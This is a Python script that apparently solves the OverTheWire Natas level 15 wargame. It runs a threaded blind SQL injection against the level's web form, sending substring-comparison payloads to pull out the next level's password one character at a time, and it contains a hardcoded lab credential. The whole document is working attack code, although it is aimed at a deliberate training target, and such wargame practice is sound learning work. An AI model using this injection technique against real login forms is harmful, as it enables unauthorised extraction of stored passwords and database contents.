# Vulnerability: SQL Injection (Blind)
# Threading enabled

import requests
import string
import colorama
import concurrent.futures
import time
from colorama import Fore, Style


# Start time
start = time.perf_counter()


# Function to brute force each character from the character list
def password_bruteforce(pos, charList, passwordList):
    for char in charList:
        payload_data = {
            "username": f'natas16" and BINARY (select substring(password,{pos},1) from users where username="natas16")="{char}"#'}

        resp = requests.post(url=url, auth=(username, password), data=payload_data)
        if "This user exists." in resp.text:
            print(payload_data)
            passwordList[pos - 1] = char
            break


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'


# Empty list to append the password of length 32 characters
passwordList = [None] * 32


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'


# Alphanumeric characters list
charList = string.ascii_letters + string.digits


# Create a ThreadPoolExecutor with the desired number of threads
with concurrent.futures.ThreadPoolExecutor(max_workers=len(password)) as executor:

    # Use a for loop to submit tasks with values from 1 to 32 i.e. the length of the password
    futures = [executor.submit(password_bruteforce, i, charList, passwordList) for i in range(1, len(password) + 1)]

    # Wait for all tasks to complete
    concurrent.futures.wait(futures)

print("\nAll tasks have finished.")


# End Time
finish = time.perf_counter()


# Total time
print(f'Brute forcing finished in {round(finish - start,2)} second(s)')


# Cracked Password
print(f"\nNatas 16: {''.join(passwordList)}")
